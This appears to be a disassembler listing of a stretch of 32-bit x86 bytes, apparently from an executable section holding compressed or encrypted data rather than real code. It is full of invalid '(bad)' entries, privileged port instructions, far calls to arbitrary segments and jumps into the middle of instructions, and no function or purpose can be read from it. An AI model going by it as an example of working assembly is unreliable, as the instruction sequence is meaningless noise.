  40d3a0:	std    
  40d3a1:	je     0x40d34f
  40d3a3:	inc    ecx
  40d3a4:	fist   DWORD PTR [eax]
  40d3a6:	(bad)  
  40d3a7:	mov    eax,0x79eae0af
  40d3ac:	js     0x40d332
  40d3ae:	(bad)  
  40d3af:	mov    ecx,0x319b06f5
  40d3b4:	push   edi
  40d3b5:	and    cl,BYTE PTR [ebx-0xfd32217]
  40d3bb:	addr16 sbb eax,0x1037fa70
  40d3c1:	fxch   st(2)
  40d3c3:	scas   eax,DWORD PTR es:[edi]
  40d3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3c5:	ja     0x40d39f
  40d3c7:	push   ebp
  40d3c8:	dec    eax
  40d3c9:	xor    al,0x7e
  40d3cb:	and    eax,0xde4b6515
  40d3d0:	or     dl,cl
  40d3d2:	scas   al,BYTE PTR es:[edi]
  40d3d3:	cmc    
  40d3d4:	jecxz  0x40d3dc
  40d3d6:	mov    esi,0x44eab759
  40d3db:	add    DWORD PTR [ebp+0x64b8ae72],edx
  40d3e1:	cmp    DWORD PTR ds:0xce48e,ebx
  40d3e7:	push   ecx
  40d3e9:	and    al,0x62
  40d3eb:	stos   DWORD PTR es:[edi],eax
  40d3ec:	jns    0x40d375
  40d3ee:	outs   dx,BYTE PTR ds:[esi]
  40d3ef:	clc    
  40d3f0:	mov    dl,0x47
  40d3f2:	test   DWORD PTR [ecx],ecx
  40d3f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3f5:	(bad)  
  40d3f6:	jne    0x40d3f4
  40d3f8:	mov    esi,0x9a7bbd3b
  40d3fd:	rol    DWORD PTR [ebp+0x6bf9b64a],0xc0
  40d404:	cmp    edi,DWORD PTR [eax-0x12ae7852]
  40d40a:	retf   0x53c1
  40d40d:	mov    edx,DWORD PTR [eax-0x31f90ef3]
  40d413:	(bad)  
  40d414:	out    dx,eax
  40d415:	sub    ah,ah
  40d417:	sbb    eax,0xa5ff255d
  40d41c:	je     0x40d48d
  40d41e:	push   0xffffffd8
  40d420:	sub    eax,0x22a1bdff
  40d425:	mov    ah,0x7a
  40d427:	jnp    0x40d3c1
  40d429:	xchg   ecx,eax
  40d42a:	pop    esp
  40d42b:	jae    0x40d402
  40d42d:	test   eax,0x711b08cf
  40d432:	or     DWORD PTR [edi],ebp
  40d434:	adc    BYTE PTR [ecx+0x56b0742b],al
  40d43a:	les    ebx,FWORD PTR [esp+eax*4]
  40d43d:	sbb    eax,0x27cb0c03
  40d442:	aam    0x2
  40d444:	pop    edx
  40d445:	or     DWORD PTR [edi+0x74678341],edi
  40d44b:	mov    ch,BYTE PTR cs:0x289b0e4a
  40d452:	xchg   esp,eax
  40d453:	(bad)  
  40d454:	out    dx,eax
  40d455:	shl    WORD PTR [ecx-0x16],1
  40d459:	cmp    al,0xd2
  40d45b:	call   0xbf18:0xace2859a
  40d462:	lahf   
  40d463:	pop    esp
  40d464:	ja     0x40d463
  40d466:	div    esp
  40d468:	xor    esp,ebp
  40d46a:	or     BYTE PTR cs:[ebx-0x2c0cdf9a],bh
  40d471:	cmp    bh,0x98
  40d474:	ret    0x4dbe
  40d477:	xor    ebx,DWORD PTR [ebx+0x1634c0fb]
  40d47d:	dec    DWORD PTR [ecx-0x56]
  40d480:	sti    
  40d481:	dec    BYTE PTR [edx-0x46]
  40d484:	std    
  40d485:	pop    ebx
  40d486:	cmp    ch,dh
  40d488:	xchg   edx,eax
  40d489:	jns    0x40d48d
  40d48b:	push   es
  40d48c:	push   eax
  40d48d:	stc    
  40d48e:	adc    eax,ebp
  40d490:	and    al,0xd8
  40d492:	cmp    ecx,DWORD PTR gs:[esi]
  40d495:	jnp    0x40d49c
  40d497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d498:	adc    dh,BYTE PTR [edx+esi*1+0x7eba2a4c]
  40d49f:	jbe    0x40d468
  40d4a1:	sub    DWORD PTR [ecx-0x5912cd3a],edx
  40d4a7:	test   eax,0xb9441d2a
  40d4ac:	cmp    al,0x11
  40d4ae:	cld    
  40d4af:	xchg   ebp,eax
  40d4b0:	inc    ebx
  40d4b1:	xor    bl,BYTE PTR [edx]
  40d4b3:	jmp    0x40d469
  40d4b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4b6:	cld    
  40d4b7:	scas   al,BYTE PTR es:[edi]
  40d4b8:	mov    cl,0x6d
  40d4ba:	lea    esi,[ecx+edx*4-0x65]
  40d4be:	stos   BYTE PTR es:[edi],al
  40d4bf:	or     al,0xeb
  40d4c1:	ror    BYTE PTR [esi],0x64
  40d4c4:	jae    0x40d4fe
  40d4c6:	push   esp
  40d4c7:	inc    eax
  40d4c8:	adc    dh,dh
  40d4ca:	sahf   
  40d4cb:	ins    BYTE PTR es:[edi],dx
  40d4cc:	retf   0x8e8
  40d4cf:	cli    
  40d4d0:	sbb    al,0x59
  40d4d2:	push   ds
  40d4d3:	xchg   edx,eax
  40d4d4:	test   DWORD PTR [ecx],esi
  40d4d6:	jbe    0x40d544
  40d4d8:	sub    eax,0xc4c43246
  40d4dd:	sbb    al,0x6a
  40d4df:	stos   DWORD PTR es:[edi],eax
  40d4e0:	ja     0x40d4c5
  40d4e2:	out    0x9b,eax
  40d4e4:	fstp   QWORD PTR [ebx+0x40]
  40d4e7:	mul    DWORD PTR [edi+0x2b168913]
  40d4ed:	mov    ds:0xfd40d936,eax
  40d4f2:	scas   al,BYTE PTR es:[edi]
  40d4f3:	test   eax,0x616c87ae
  40d4f8:	icebp  
  40d4f9:	out    dx,eax
  40d4fa:	shr    DWORD PTR [esi-0x7d],cl
  40d4fd:	scas   al,BYTE PTR es:[edi]
  40d4fe:	(bad)  
  40d4ff:	adc    bh,BYTE PTR [ebp+0x2d]
  40d502:	int3   
  40d503:	add    eax,0x4a1f158a
  40d508:	or     BYTE PTR [ebp+0x4],dl
  40d50b:	daa    
  40d50c:	push   esi
  40d50d:	mov    edx,0x75a04c88
  40d512:	or     al,0xec
  40d514:	mov    dh,0x5
  40d516:	sbb    ah,0x38
  40d519:	call   DWORD PTR [edi+0x2a]
  40d51c:	and    DWORD PTR ds:0xe71c8d63,edx
  40d522:	dec    esp
  40d523:	clc    
  40d524:	xchg   BYTE PTR ds:0xf4e72a0c,al
  40d52a:	in     al,0x4
  40d52c:	xor    edi,DWORD PTR [di]
  40d52f:	loopne 0x40d551
  40d531:	push   ecx
  40d532:	xchg   esi,eax
  40d533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d534:	jbe    0x40d574
  40d536:	add    eax,0x4a65e57
  40d53b:	pop    ebx
  40d53c:	(bad)  
  40d53d:	xchg   ebx,eax
  40d53e:	xor    eax,0x5f184a79
  40d543:	in     eax,0x3b
  40d545:	call   0x95515b8a
  40d54a:	mov    WORD PTR [ecx-0x49],ds
  40d54d:	std    
  40d54e:	rcl    BYTE PTR [ebx],cl
  40d550:	dec    esi
  40d551:	pop    ss
  40d552:	cs adc al,0x2e
  40d555:	adc    esi,edx
  40d557:	sahf   
  40d558:	xor    DWORD PTR [edx+0x9f5914d],ebx
  40d55e:	iret   
  40d55f:	jo     0x40d546
  40d561:	pop    eax
  40d562:	jmp    0x40d518
  40d564:	adc    al,0xb6
  40d566:	fst    DWORD PTR [edx-0x3e6df7ad]
  40d56c:	xchg   DWORD PTR gs:[edx-0x7aece5b9],ebp
  40d573:	xlat   BYTE PTR ds:[ebx]
  40d574:	dec    edi
  40d575:	sbb    bh,BYTE PTR [eax-0x3ea2e005]
  40d57b:	push   esp
  40d57c:	dec    ebp
  40d57d:	test   ch,ah
  40d57f:	ret    0x50db
  40d582:	fwait
  40d583:	or     DWORD PTR [edx+0x42],esi
  40d586:	mov    al,0x20
  40d588:	cmp    al,0x14
  40d58a:	sti    
  40d58b:	stc    
  40d58c:	imul   ebx,edx,0xffffffd4
  40d58f:	sbb    dl,BYTE PTR [ebp-0x2f]
  40d592:	int    0xd0
  40d594:	add    edx,DWORD PTR [ecx]
  40d596:	xchg   ebp,esp
  40d598:	xchg   edi,eax
  40d599:	mov    esi,0xdde04c86
  40d59e:	adc    DWORD PTR [edx+edx*4],edi
  40d5a1:	pop    edi
  40d5a2:	gs adc DWORD PTR ss:[edx],edi
  40d5a6:	stos   BYTE PTR es:[edi],al
  40d5a7:	ffree  st(3)
  40d5a9:	dec    ebx
  40d5aa:	cld    
  40d5ab:	iret   
  40d5ac:	jae    0x40d604
  40d5ae:	daa    
  40d5af:	xor    DWORD PTR [ebx-0x59],0x45
  40d5b3:	pop    edi
  40d5b4:	imul   esi,DWORD PTR [ecx-0x28],0x299c8226
  40d5bb:	mov    cl,0x14
  40d5bd:	mov    eax,0x3360b4e3
  40d5c2:	lahf   
  40d5c3:	xchg   esp,eax
  40d5c4:	dec    ebx
  40d5c5:	repz loop 0x40d566
  40d5c8:	lock in al,dx
  40d5ca:	mov    eax,ds:0x92120c99
  40d5cf:	dec    edi
  40d5d0:	stc    
  40d5d1:	push   esp
  40d5d2:	pop    eax
  40d5d3:	add    BYTE PTR [eax-0x34],bh
  40d5d6:	pusha  
  40d5d7:	nop
  40d5d8:	jnp    0x40d587
  40d5da:	sahf   
  40d5db:	sub    eax,eax
  40d5dd:	sbb    al,0xdd
  40d5df:	aas    
  40d5e0:	lock pop eax
  40d5e2:	pop    edx
  40d5e3:	xchg   esp,eax
  40d5e4:	aaa    
  40d5e5:	cli    
  40d5e6:	or     BYTE PTR [ebp-0x144768a3],0x1b
  40d5ed:	jge    0x40d5a0
  40d5ef:	push   0x8977d329
  40d5f4:	mov    bh,0xfc
  40d5f6:	jno    0x40d5ea
  40d5f8:	add    BYTE PTR [eax+0x73],ah
  40d5fb:	ss stos DWORD PTR es:[edi],eax
  40d5fd:	mov    eax,ds:0x8e6813e3
  40d602:	mov    dl,0xc5
  40d604:	mov    cl,0xea
  40d606:	adc    ecx,eax
  40d608:	jne    0x40d598
  40d60a:	clc    
  40d60b:	sbb    al,0xe9
  40d60d:	jns    0x40d674
  40d60f:	adc    al,0x1d
  40d611:	push   esi
  40d612:	outs   dx,DWORD PTR ss:[esi]
  40d614:	xor    edx,ebx
  40d616:	push   0x44
  40d618:	push   es
  40d619:	(bad)  
  40d61a:	adc    ecx,DWORD PTR [edi-0x7e]
  40d61d:	dec    edx
  40d61e:	test   DWORD PTR [eax],edi
  40d620:	stos   BYTE PTR es:[edi],al
  40d621:	std    
  40d622:	mov    edi,DWORD PTR [edi+ecx*2]
  40d625:	mov    es,edx
  40d627:	call   0x87cf:0xca59522d
  40d62e:	retf   0x7047
  40d631:	and    al,BYTE PTR [eax+0x34]
  40d634:	ins    DWORD PTR es:[edi],dx
  40d635:	push   edi
  40d636:	out    dx,al
  40d637:	inc    ebp
  40d638:	fmul   DWORD PTR [esi]
  40d63a:	push   esp
  40d63b:	mov    cl,BYTE PTR [ebx-0x32]
  40d63e:	imul   ebp,ebp,0x489c507e
  40d644:	sahf   
  40d645:	xor    eax,0xdfb3aee8
  40d64a:	push   cs
  40d64b:	je     0xb21304c8
  40d651:	sub    al,0x28
  40d653:	ins    DWORD PTR es:[edi],dx
  40d654:	inc    edi
  40d655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d656:	loop   0x40d5dc
  40d658:	pop    eax
  40d659:	sub    BYTE PTR [ecx+eax*1+0x48e9ff15],ah
  40d660:	aas    
  40d661:	call   0xfd0a:0xcd87be4e
  40d668:	jl     0x40d650
  40d66a:	add    BYTE PTR [edx+edx*8],cl
  40d66d:	or     dh,BYTE PTR [ecx+0x30809a4c]
  40d673:	xor    DWORD PTR ds:0x92c8ab8e,esp
  40d679:	xchg   edx,eax
  40d67a:	xor    DWORD PTR [ebx-0x267dfbf2],ebx
  40d680:	xchg   ebp,eax
  40d681:	ins    DWORD PTR es:[edi],dx
  40d682:	inc    ebp
  40d683:	xor    cl,bl
  40d685:	lods   eax,DWORD PTR ds:[esi]
  40d686:	dec    ebp
  40d687:	pop    ebx
  40d688:	ret    
  40d689:	fild   WORD PTR [eax+esi*4-0x71b3a79c]
  40d690:	add    BYTE PTR [ecx],bh
  40d692:	sbb    BYTE PTR [edi+0x77],bl
  40d695:	lea    esi,[ecx-0x73]
  40d698:	mov    ds:0x5926e462,al
  40d69d:	push   cs
  40d69e:	out    dx,al
  40d69f:	and    ch,bl
  40d6a1:	cmp    al,BYTE PTR [edi]
  40d6a3:	lea    ecx,[esi+0x73]
  40d6a6:	pop    ebx
  40d6a7:	das    
  40d6a8:	sub    eax,0x727fb110
  40d6ad:	in     al,dx
  40d6ae:	adc    BYTE PTR [esi-0x63],dl
  40d6b1:	hlt    
  40d6b2:	jg     0x40d66b
  40d6b4:	rcl    eax,0x5f
  40d6b7:	pop    edi
  40d6b8:	sar    DWORD PTR [esp+edi*4],cl
  40d6bb:	in     al,0x73
  40d6bd:	cmp    ch,BYTE PTR [ecx+0x6af2d8ee]
  40d6c3:	arpl   WORD PTR [ebp+edi*4+0x5d823b1a],ax
  40d6ca:	cli    
  40d6cb:	mov    ecx,0xe1a91a8d
  40d6d0:	sbb    DWORD PTR [ebp+0x45],edi
  40d6d3:	data16 mov cl,0x88
  40d6d6:	sbb    eax,0x10ba3336
  40d6db:	shl    ecx,1
  40d6dd:	ficomp DWORD PTR [ecx+0x8]
  40d6e0:	mov    ecx,0x5318e1b9
  40d6e5:	pop    edi
  40d6e6:	push   esp
  40d6e7:	mov    DWORD PTR [edi+edi*1-0x2b708772],edx
  40d6ee:	or     al,0xf
  40d6f0:	cmp    ch,bh
  40d6f2:	neg    BYTE PTR [esi]
  40d6f4:	mov    WORD PTR [edi-0x58dafdea],gs
  40d6fa:	(bad)  
  40d6fb:	in     eax,dx
  40d6fc:	sti    
  40d6fd:	adc    al,0x43
  40d6ff:	outs   dx,BYTE PTR ds:[esi]
  40d700:	xor    edi,DWORD PTR [eax-0x42d4797]
  40d706:	inc    esi
  40d707:	das    
  40d708:	nop
  40d709:	xchg   dh,ah
  40d70b:	adc    edi,DWORD PTR [eax-0x4fbc89db]
  40d711:	xchg   esi,eax
  40d712:	loopne 0x40d748
  40d714:	lea    edx,[ebx]
  40d716:	push   0xef72cf85
  40d71b:	lds    ecx,FWORD PTR ss:[ebp+ecx*2-0x7e270bc9]
  40d723:	mov    esp,0xb93f8faa
  40d728:	xlat   BYTE PTR ds:[ebx]
  40d729:	sub    BYTE PTR [ebp+0x11648086],ah
  40d72f:	sbb    edx,DWORD PTR [ebp-0x57d8a4a2]
  40d735:	add    ebx,ebp
  40d737:	or     BYTE PTR [ebx-0x3d],dl
  40d73a:	in     eax,0x9
  40d73c:	inc    esp
  40d73d:	pop    ss
  40d73e:	stc    
  40d73f:	cmp    DWORD PTR [ebp+0x528c798],0xffffffc5
  40d746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d747:	bound  ecx,QWORD PTR [edx+0x2e]
  40d74a:	jno    0x40d7c0
  40d74c:	call   DWORD PTR [edx]
  40d74e:	pop    ds
  40d74f:	fcmovnbe st,st(5)
  40d751:	in     al,0x74
  40d753:	mov    al,ds:0x4cd36584
  40d758:	mov    eax,ds:0x8e6aa6a8
  40d75d:	sbb    BYTE PTR [edi-0x9d6d675],bl
  40d763:	sub    DWORD PTR [ecx-0x2a4b62bb],ebx
  40d769:	push   esp
  40d76a:	sahf   
  40d76b:	mov    ss:0x2add8c30,eax
  40d771:	sub    BYTE PTR [edx],0x61
  40d774:	mov    esi,0xf7d1c2
  40d779:	mov    BYTE PTR [ecx],bl
  40d77b:	bound  ebp,QWORD PTR [edx-0x7a]
  40d77e:	cmp    eax,0x64fa5d72
  40d783:	add    DWORD PTR [ebx],0xdc243c5e
  40d789:	xchg   ecx,eax
  40d78a:	jne    0x40d768
  40d78c:	cs mov edx,0xb54db860
  40d792:	daa    
  40d793:	call   0x7f6d:0xec9465ee
  40d79a:	fisub  WORD PTR [esi+0x2a]
  40d79d:	popa   
  40d79e:	xor    esi,DWORD PTR [edi]
  40d7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7a1:	mov    al,0xc
  40d7a3:	mov    ds:0x59abc5db,eax
  40d7a8:	xor    eax,DWORD PTR [eax-0x6a]
  40d7ab:	mov    eax,0xded9e244
  40d7b0:	dec    ecx
  40d7b1:	dec    ebx
  40d7b2:	out    0x1f,al
  40d7b4:	jle    0x40d7b5
  40d7b6:	and    DWORD PTR [eax+edi*4],edx
  40d7b9:	jmp    0x40d7df
  40d7bb:	fs sbb eax,0xc0b4ae3
  40d7c1:	mov    edi,0x15297a0d
  40d7c6:	mov    esp,0x9719068b
  40d7cb:	mov    cl,0xfd
  40d7cd:	xor    BYTE PTR [eax-0x415aa151],al
  40d7d3:	clc    
  40d7d4:	sub    BYTE PTR [eax+0x0],cl
  40d7d7:	mov    ds:0x7f2c9daa,al
  40d7dc:	int    0x9d
  40d7de:	mov    dh,0x97
  40d7e0:	push   edx
  40d7e1:	pusha  
  40d7e2:	loopne 0x40d782
  40d7e4:	sbb    dl,BYTE PTR [ebp+edi*2+0x3aacfc4f]
  40d7eb:	sub    bh,BYTE PTR ds:0x9e62099f
  40d7f1:	push   ecx
  40d7f2:	xchg   esi,eax
  40d7f3:	inc    ecx
  40d7f4:	pusha  
  40d7f5:	cli    
  40d7f6:	push   ss
  40d7f7:	push   ss
  40d7f8:	cmove  edx,DWORD PTR [esp+esi*4-0x7b]
  40d7fd:	aad    0xae
  40d7ff:	jo     0x40d7f2
  40d801:	stc    
  40d802:	inc    ebp
  40d803:	outs   dx,BYTE PTR ds:[esi]
  40d804:	xor    DWORD PTR [ebp+0xe],ecx
  40d807:	out    0x96,al
  40d809:	pop    es
  40d80a:	mov    ebp,0x823b9715
  40d80f:	ret    0x67b3
  40d812:	inc    ecx
  40d813:	cmp    esp,esp
  40d815:	add    eax,0xd0046c11
  40d81a:	gs xchg ebx,eax
  40d81c:	cwde   
  40d81d:	pop    esp
  40d81e:	xor    BYTE PTR [edi+ebx*1],ah
  40d821:	adc    edi,DWORD PTR [edi-0x77227b84]
  40d827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d828:	test   BYTE PTR [edi+0x6b3e4079],ch
  40d82e:	into   
  40d82f:	inc    edx
  40d830:	out    0xa7,al
  40d832:	hlt    
  40d833:	xchg   edx,eax
  40d834:	mov    cl,0x2b
  40d836:	pop    ebp
  40d837:	pop    ss
  40d838:	out    0x62,al
  40d83a:	inc    esp
  40d83b:	iret   
  40d83c:	jge    0x40d841
  40d83e:	add    dh,BYTE PTR [esi+0x6]
  40d841:	jns    0x40d80e
  40d843:	lock mov edi,ebx
  40d846:	cwde   
  40d847:	mov    BYTE PTR [eax+0x3bb63bb6],dl
  40d84d:	daa    
  40d84e:	shl    cl,1
  40d850:	jnp    0x40d873
  40d852:	in     eax,dx
  40d853:	and    esp,DWORD PTR [edx-0x7f]
  40d856:	pop    eax
  40d857:	jnp    0x40d895
  40d859:	xor    DWORD PTR [esi+0x2e],eax
  40d85c:	dec    ecx
  40d85d:	add    DWORD PTR [edi-0x672b8dbd],0x3b
  40d864:	mov    ah,0xf0
  40d866:	adc    ch,BYTE PTR [eax]
  40d868:	rcl    ah,1
  40d86a:	sub    eax,0xc059b482
  40d86f:	rol    BYTE PTR [eax+0x4a],0xc7
  40d873:	and    ah,BYTE PTR [eax]
  40d875:	adc    al,0x97
  40d877:	ins    BYTE PTR es:[edi],dx
  40d878:	int3   
  40d879:	pop    es
  40d87a:	dec    ebp
  40d87b:	leave  
  40d87c:	jbe    0x40d814
  40d87e:	or     al,0x5a
  40d880:	push   ss
  40d881:	adc    ecx,edx
  40d883:	cmc    
  40d884:	inc    edx
  40d885:	mov    cs,WORD PTR [ebx-0x4e035ea7]
  40d88b:	ins    BYTE PTR es:[edi],dx
  40d88c:	test   ah,bh
  40d88e:	(bad)  
  40d88f:	jns    0x40d823
  40d891:	cmp    BYTE PTR [ebp-0x50],cl
  40d894:	adc    edx,edx
  40d896:	inc    esi
  40d897:	cmp    al,0x72
  40d899:	inc    edi
  40d89a:	sub    al,0x72
  40d89c:	js     0x40d914
  40d89e:	xchg   ebp,eax
  40d89f:	ror    DWORD PTR [esi+0x79d3e76c],cl
  40d8a5:	jp     0x40d88b
  40d8a7:	es inc edi
  40d8a9:	cld    
  40d8aa:	mov    WORD PTR [edx+0x44354fa5],es
  40d8b0:	pushf  
  40d8b1:	ins    BYTE PTR es:[edi],dx
  40d8b2:	or     BYTE PTR [esi-0x6b],0x11
  40d8b6:	cs into 
  40d8b8:	(bad)  
  40d8b9:	sub    ecx,esi
  40d8bb:	test   eax,0x880b5dd
  40d8c0:	xchg   esp,eax
  40d8c1:	xchg   bl,ah
  40d8c3:	xor    BYTE PTR [edi+0x72],al
  40d8c6:	out    dx,al
  40d8c7:	inc    esi
  40d8c8:	sub    eax,0xbc0e3c9d
  40d8cd:	out    0x67,al
  40d8cf:	fcomp  DWORD PTR [ebp-0x37]
  40d8d2:	or     esi,DWORD PTR [edx+0x2f156034]
  40d8d8:	bound  ebx,QWORD PTR [ecx]
  40d8da:	mov    WORD PTR [edi],gs
  40d8dc:	sub    eax,0xfed40969
  40d8e1:	lods   al,BYTE PTR ds:[esi]
  40d8e2:	out    dx,al
  40d8e3:	stc    
  40d8e4:	jg     0x40d8e6
  40d8e6:	dec    ebx
  40d8e7:	out    0x63,eax
  40d8e9:	inc    edx
  40d8ea:	xchg   esp,eax
  40d8eb:	loope  0x40d883
  40d8ed:	stos   BYTE PTR es:[edi],al
  40d8ee:	gs (bad) 
  40d8f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8f1:	mov    WORD PTR [edx+0x45],es
  40d8f4:	scas   eax,DWORD PTR es:[edi]
  40d8f5:	ret    
  40d8f6:	mov    ?,WORD PTR [edx+0x2b]
  40d8f9:	sar    DWORD PTR [ecx],cl
  40d8fb:	pusha  
  40d8fc:	aas    
  40d8fd:	sbb    dl,BYTE PTR [edx]
  40d8ff:	xchg   ebp,eax
  40d900:	test   al,0xe2
  40d902:	fst    st(3)
  40d904:	pop    edx
  40d905:	xchg   ebx,eax
  40d906:	mov    dl,0x17
  40d908:	inc    esp
  40d909:	call   0xafc3:0x69dd87bf
  40d910:	mov    gs,edi
  40d912:	dec    eax
  40d913:	push   eax
  40d914:	jo     0x40d981
  40d916:	les    eax,FWORD PTR [ecx+0x64847a7]
  40d91c:	xor    al,0xff
  40d91e:	pop    ecx
  40d91f:	mov    edx,0x41f86327
  40d924:	(bad)
  40d927:	sub    bh,BYTE PTR ss:[ebp+0x3e7663c6]
  40d92e:	inc    edi
  40d92f:	add    al,0xe6
  40d931:	cmp    ecx,DWORD PTR [ecx+0x35be4a9e]
  40d937:	xchg   edi,eax
  40d938:	mov    edi,0xad30cb1f
  40d93d:	jmp    0xd984a591
  40d942:	mov    ebp,0xaeceaad1
  40d947:	aad    0x74
  40d949:	addr16 push 0x9440a3de
  40d94f:	adc    DWORD PTR [esp+ecx*1+0x58abb2f2],esi
  40d956:	cmp    cl,BYTE PTR [esi-0x1e858b67]
  40d95c:	dec    edx
  40d95d:	outs   dx,DWORD PTR ds:[esi]
  40d95e:	in     al,0x77
  40d960:	aad    0x5f
  40d962:	lods   al,BYTE PTR ds:[esi]
  40d963:	push   eax
  40d964:	popf   
  40d965:	test   BYTE PTR [esi],ah
  40d967:	adc    eax,0x7e4e1a13
  40d96c:	shl    BYTE PTR [esi-0x59],cl
  40d96f:	(bad)  
  40d970:	mov    ecx,0x4d2e3a27
  40d975:	xchg   ecx,esi
  40d977:	in     eax,0x2d
  40d979:	pop    ss
  40d97a:	push   eax
  40d97b:	mov    ds:0xf0f9d8bc,al
  40d980:	pusha  
  40d981:	jmp    0xf33e:0xbc3505a3
  40d988:	push   ebp
  40d989:	in     eax,0xdc
  40d98b:	out    dx,al
  40d98c:	pushf  
  40d98d:	imul   ecx,DWORD PTR [ebx*2+0x261d910f],0x5
  40d995:	jg     0x40da14
  40d997:	fs ret 0x54b1
  40d99b:	xor    dh,dh
  40d99d:	jb     0x40d9f9
  40d99f:	es jle 0x40d9e3
  40d9a2:	mov    edx,0xa9afd4e6
  40d9a7:	inc    ecx
  40d9a8:	pop    ebp
  40d9a9:	xor    al,0xaa
  40d9ab:	mov    DWORD PTR [edx+0x3dd8c7e8],ebp
  40d9b1:	sub    DWORD PTR [ecx+0x2e],ecx
  40d9b4:	(bad)  
  40d9b5:	cdq    
  40d9b6:	pop    ecx
  40d9b7:	xchg   edi,eax
  40d9b8:	int    0x5b
  40d9ba:	retf   0xb6b7
  40d9bd:	dec    ebp
  40d9be:	push   ds
  40d9bf:	jl     0x40da29
  40d9c1:	ror    DWORD PTR [ebp+0x1cdfacd],0xa
  40d9c8:	sub    dl,bl
  40d9ca:	mov    edi,0x7d5ae125
  40d9cf:	dec    ecx
  40d9d0:	and    eax,0x2582c471
  40d9d5:	pop    ebx
  40d9d6:	pop    eax
  40d9d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9d8:	sub    DWORD PTR [ebp-0x3c6df90],ebx
  40d9de:	mov    ds,WORD PTR [ecx]
  40d9e0:	sbb    BYTE PTR [edx-0x35],0x9
  40d9e4:	inc    esp
  40d9e5:	pop    ds
  40d9e6:	sbb    esp,DWORD PTR [edi+0x46]
  40d9e9:	outs   dx,BYTE PTR ds:[esi]
  40d9ea:	inc    ebp
  40d9eb:	mov    bh,0x88
  40d9ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9ee:	jg     0x40da34
  40d9f0:	shl    DWORD PTR [esi],cl
  40d9f2:	push   eax
  40d9f3:	hlt    
  40d9f4:	xchg   DWORD PTR ds:0x9a4c2cca,esp
  40d9fa:	mov    ds:0xde87b179,eax
  40d9ff:	sub    ecx,ecx
  40da01:	xchg   edi,eax
  40da02:	cdq    
  40da03:	jg     0x40da78
  40da05:	xchg   cx,ax
  40da07:	push   ds
  40da08:	test   eax,0xaa0db028
  40da0d:	inc    DWORD PTR [edx+0xd0d0ac4]
  40da13:	fs in  al,0xa3
  40da16:	(bad)  
  40da18:	inc    edx
  40da19:	mov    ah,0xc7
  40da1b:	xor    DWORD PTR [ecx-0x355a9042],ebx
  40da21:	inc    esi
  40da22:	jnp    0x40d9ba
  40da24:	or     esp,DWORD PTR [edi+0x1cb7a88d]
  40da2a:	push   edi
  40da2b:	xor    DWORD PTR [esi],0x16ed11c8
  40da31:	icebp  
  40da32:	in     eax,dx
  40da33:	imul   esi,DWORD PTR [eax+esi*2],0xcdc23f0b
  40da3a:	sub    esi,DWORD PTR [edx+0x12]
  40da3d:	iret   
  40da3e:	sub    BYTE PTR [eax],bh
  40da40:	and    al,BYTE PTR [ebx-0x4eab2140]
  40da46:	xchg   ebp,eax
  40da47:	mov    dl,0xe1
  40da49:	cld    
  40da4a:	jge    0x40da9b
  40da4c:	adc    DWORD PTR [ecx+0x49],eax
  40da4f:	aaa    
  40da50:	adc    BYTE PTR [edi+0x8],0xd1
  40da54:	mov    esp,ebp
  40da56:	test   eax,0xe21afb85
  40da5b:	and    DWORD PTR [eax],esp
  40da5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da5e:	leave  
  40da5f:	ss sub al,dh
  40da62:	gs inc eax
  40da64:	scas   al,BYTE PTR es:[edi]
  40da65:	push   ds
  40da66:	add    ebp,DWORD PTR ss:[esi]
  40da69:	sti    
  40da6a:	sbb    ecx,edx
  40da6c:	(bad)  
  40da6d:	and    al,al
  40da6f:	xor    eax,0xa9e6b471
  40da74:	out    dx,al
  40da75:	mov    ecx,0x9331569c
  40da7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da7b:	ret    0xe6af
  40da7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da80:	fcom   QWORD PTR [edi*4+0x4a0265fe]
  40da87:	sti    
  40da88:	push   ds
  40da89:	adc    ecx,DWORD PTR [eax+ebp*4+0x6a]
  40da8d:	jno    0x40da32
  40da8f:	loope  0x40da88
  40da91:	pop    edx
  40da92:	nop
  40da93:	xchg   esp,eax
  40da94:	loope  0x40dae7
  40da96:	int3   
  40da97:	cli    
  40da98:	push   eax
  40da99:	repz cs inc ebx
  40da9c:	es ss xchg ebx,eax
  40da9f:	sub    BYTE PTR gs:[edx+edi*4],dl
  40daa3:	inc    ecx
  40daa4:	xor    ebx,DWORD PTR [ebx]
  40daa6:	mov    esp,0x1fc2e2a3
  40daab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daac:	leave  
  40daad:	dec    esp
  40daae:	adc    eax,0x989206db
  40dab3:	pop    esi
  40dab4:	outs   dx,BYTE PTR ds:[esi]
  40dab5:	clc    
  40dab6:	mov    eax,ds:0xe959caa8
  40dabb:	push   edi
  40dabc:	pushf  
  40dabd:	lahf   
  40dabe:	out    0xf4,eax
  40dac0:	ja     0x40da9d
  40dac2:	pop    edi
  40dac3:	adc    eax,0xeb6fe56e
  40dac8:	gs or  bh,ch
  40dacb:	sbb    eax,edi
  40dacd:	or     BYTE PTR [edi-0x5b],cl
  40dad0:	pop    ss
  40dad1:	mov    dl,0x66
  40dad3:	mov    al,ds:0x84c955c5
  40dad8:	es mov cl,0xd1
  40dadb:	cld    
  40dadc:	inc    eax
  40dadd:	std    
  40dade:	(bad)  
  40dadf:	(bad)  
  40dae0:	ds mov esp,0xc9edac6f
  40dae6:	mov    ah,0xae
  40dae8:	mov    dl,0x68
  40daea:	gs (bad) 
  40daec:	test   eax,0xc99328af
  40daf1:	push   esp
  40daf2:	mov    esp,0x411e93a0
